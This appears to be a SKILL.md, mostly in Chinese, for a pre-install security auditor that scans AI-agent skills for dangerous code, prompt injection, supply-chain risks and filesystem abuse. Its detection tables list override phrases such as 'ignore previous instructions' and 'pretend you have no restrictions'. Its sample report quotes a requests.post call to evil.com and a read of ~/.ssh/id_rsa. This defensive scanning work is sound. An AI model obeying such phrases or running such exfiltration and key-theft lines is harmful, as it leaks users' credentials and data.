---
name: "skill-security-auditor"
description: >
  **AI代理技能的安装前安全审计与漏洞扫描工具**  
  适用于以下场景：  
  (1) 评估来自不可信来源的技能；  
  (2) 审查技能目录或Git仓库URL中是否存在恶意代码；  
  (3) 在安装Claude Code插件、OpenClaw技能或Codex技能之前进行安全检查；  
  (4) 扫描Python脚本中可能存在的危险代码（如`os.system`、`eval`、`subprocess`等函数，以及可能导致网络数据泄露的代码）；  
  (5) 检测`SKILL.md`文件中是否存在命令注入（prompt injection）攻击；  
  (6) 识别依赖项供应链中的安全风险；  
  (7) 确保文件系统的访问权限仅限于技能本身的使用范围。  
  **触发命令示例**：  
  `audit this skill`  
  `is this skill safe`  
  `scan skill for security`  
  `check skill before install`  
  `skill security check`  
  `skill vulnerability scan`
---
# 技能安全审计器

在安装之前，扫描并审计 AI 代理技能中的安全风险。会生成明确的 **通过 / 警告 / 失败** 判断结果，并提供问题发现及修复建议。

## 快速入门

```bash
# Audit a local skill directory
python3 scripts/skill_security_auditor.py /path/to/skill-name/

# Audit a skill from a git repo
python3 scripts/skill_security_auditor.py https://github.com/user/repo --skill skill-name

# Audit with strict mode (any WARN becomes FAIL)
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --strict

# Output JSON report
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --json
```

## 扫描内容

### 1. 代码执行风险（Python/Bash 脚本）

扫描所有 `.py`、`.sh`、`.bash`、`.js`、`.ts` 文件，检查以下风险：

| 类别 | 检测到的模式 | 严重程度 |
|----------|-------------------|----------|
| **命令注入** | `os.system()`、`os.popen()`、`subprocess.call(shell=True)`、反引号执行 | 🔴 严重 |
| **代码执行** | `eval()`、`exec()`、`compile()`、`__import__()` | 🔴 严重 |
| **代码混淆** | 基64编码的负载、`codecs.decode`、十六进制编码的字符串 | 🔴 严重 |
| **网络数据泄露** | `requests.post()`、`urllib.request`、`socket.connect()`、`httpx`、`aiohttp` | 🔴 严重 |
| **凭证收集** | 从 `~/.ssh`、`~/.aws`、`~/.config` 中读取数据 | 🔴 严重 |
| **文件系统滥用** | 在技能目录外写入文件、修改 `/etc/`、`~/.bashrc`、`~/.profile`、创建符号链接 | 🟡 高风险 |
| **权限提升** | `sudo`、`chmod 777`、`setuid`、修改 cron 任务 | 🔴 严重 |
| **不安全的反序列化** | `pickle.loads()`、`yaml.load()`（未使用 SafeLoader）、`marshal.loads()` | 🟡 高风险 |
| **安全的子进程调用** | 使用列表参数的 `subprocess.run()`（不通过 shell） | ⚪ 信息提示 |

### 2. SKILL.md 文件中的提示注入

扫描 SKILL.md 及所有 `.md` 参考文件，检查以下风险：

| 模式 | 例子 | 严重程度 |
|---------|---------|----------|
| **系统提示覆盖** | “忽略之前的指令”、“你现在...” | 🔴 严重 |
| **角色劫持** | “以 root 权限执行”、“假装你没有任何限制” | 🔴 严重 |
| **安全绕过** | “跳过安全检查”、“禁用内容过滤” | 🔴 严重 |
| **隐藏指令** | 零宽度字符、包含指令的 HTML 注释 | 🟡 高风险 |
| **过度权限** | “可以执行任何命令”、“具有完整的文件系统访问权限” | 🟡 高风险 |
| **数据提取** | “发送文件内容”、“上传文件到”、“POST 到...” | 🔴 严重 |

### 3. 依赖项供应链

对于包含 `requirements.txt`、`package.json` 或内联 `pip install` 的技能：

| 检查项 | 检查内容 | 严重程度 |
|-------|-------------|----------|
| **已知漏洞** | 与 PyPI/npm 的漏洞数据库进行交叉比对 | 🔴 严重 |
| **域名抢注** | 标记与流行包相似的包（例如 `reqeusts`） | 🟡 高风险 |
| **未固定的版本** | 标记 `requests>=2.0` 而实际为 `requests==2.31.0` | ⚪ 信息提示 |
| **代码中包含安装命令** | 在脚本中直接使用 `pip install` 或 `npm install` | 🟡 高风险 |
| **可疑包** | 下载次数少、创建时间较短、维护者单一 | ⚪ 信息提示 |

### 4. 文件系统与结构

| 检查项 | 检查内容 | 严重程度 |
|-------|-------------|----------|
| **边界违规** | 脚本引用技能目录外的路径 | 🟡 高风险 |
| **隐藏文件** | 不应存在于技能目录中的 `.env`、点文件（dotfiles） | 🟡 高风险 |
| **二进制文件** | 意外的可执行文件（`.so`、`.dll`、`.exe`） | 🔴 严重 |
| **大文件** | 大于 1MB 的文件可能隐藏恶意负载 | ⚪ 信息提示 |
| **符号链接** | 指向技能目录外的符号链接 | 🔴 严重 |

## 审计工作流程

1. 在技能目录或仓库 URL 上运行扫描器。
2. 查看报告——按严重程度分组的问题发现。
3. 判断结果：
   - **✅ 通过** — 未发现严重或高风险问题。可以安全安装。
   - **⚠️ 警告** — 发现高风险/中等风险问题。安装前请手动检查。
   - **❌ 失败** — 发现严重问题。未经修复前请勿安装。
4. 根据报告中的修复建议进行修复。

## 查看报告

```
╔══════════════════════════════════════════════╗
║  SKILL SECURITY AUDIT REPORT                ║
║  Skill: example-skill                        ║
║  Verdict: ❌ FAIL                            ║
╠══════════════════════════════════════════════╣
║  🔴 CRITICAL: 2  🟡 HIGH: 1  ⚪ INFO: 3    ║
╚══════════════════════════════════════════════╝

🔴 CRITICAL [CODE-EXEC] scripts/helper.py:42
   Pattern: eval(user_input)
   Risk: Arbitrary code execution from untrusted input
   Fix: Replace eval() with ast.literal_eval() or explicit parsing

🔴 CRITICAL [NET-EXFIL] scripts/analyzer.py:88
   Pattern: requests.post("https://evil.com/collect", data=results)
   Risk: Data exfiltration to external server
   Fix: Remove outbound network calls or verify destination is trusted

🟡 HIGH [FS-BOUNDARY] scripts/scanner.py:15
   Pattern: open(os.path.expanduser("~/.ssh/id_rsa"))
   Risk: Reads SSH private key outside skill scope
   Fix: Remove filesystem access outside skill directory

⚪ INFO [DEPS-UNPIN] requirements.txt:3
   Pattern: requests>=2.0
   Risk: Unpinned dependency may introduce vulnerabilities
   Fix: Pin to specific version: requests==2.31.0
```

## 高级用法

### 在克隆之前从 Git 中审计技能

```bash
# Clone to temp dir, audit, then clean up
python3 scripts/skill_security_auditor.py https://github.com/user/skill-repo --skill my-skill --cleanup
```

### 集成到持续集成/持续部署（CI/CD）流程

```yaml
# GitHub Actions step
- name: "audit-skill-security"
  run: |
    python3 skill-security-auditor/scripts/skill_security_auditor.py ./skills/new-skill/ --strict --json > audit.json
    if [ $? -ne 0 ]; then echo "Security audit failed"; exit 1; fi
```

### 批量审计

```bash
# Audit all skills in a directory
for skill in skills/*/; do
  python3 scripts/skill_security_auditor.py "$skill" --json >> audit-results.jsonl
done
```

## 威胁模型参考

有关完整的威胁模型、检测模式以及对 AI 代理技能的已知攻击方式，请参阅 [references/threat-model.md](references/threat-model.md)。

## 限制

- 无法确定地检测逻辑炸弹或延迟执行的恶意负载。
- 混淆代码的检测基于模式——具有足够创造力的攻击者可能会绕过这些检测。
- 网络目标地址的验证需要互联网连接。
- 仅进行静态分析（安全但不如动态分析全面）。
- 依赖项漏洞检测使用本地模式匹配，而非实时 CVE 数据库。

审计后如有疑问，请**不要安装**。请向技能作者咨询以获取澄清。